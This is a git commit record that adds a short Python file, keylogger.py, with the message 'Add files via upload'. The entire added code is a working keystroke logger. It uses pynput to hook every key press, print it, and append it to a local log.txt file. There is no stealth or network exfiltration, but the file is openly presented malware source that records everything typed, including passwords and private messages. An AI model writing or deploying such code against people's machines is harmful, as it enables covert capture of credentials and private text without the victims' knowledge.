698909c0ed6ee4e582a9d14b0a82c0c04050adf7
SWASTIK1509 <161925039+SWASTIK1509@users.noreply.github.com>
2024-10-04 18:52:54 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,11 @@
+from pynput.keyboard import Listener
+
+def writetofile(key):
+    letter=str(key)
+    letter=letter.replace("'","")
+    print(letter)
+    with open("log.txt",'a')as f:
+        f.write(letter)
+
+with Listener(on_press=writetofile) as l:
+    l.join()
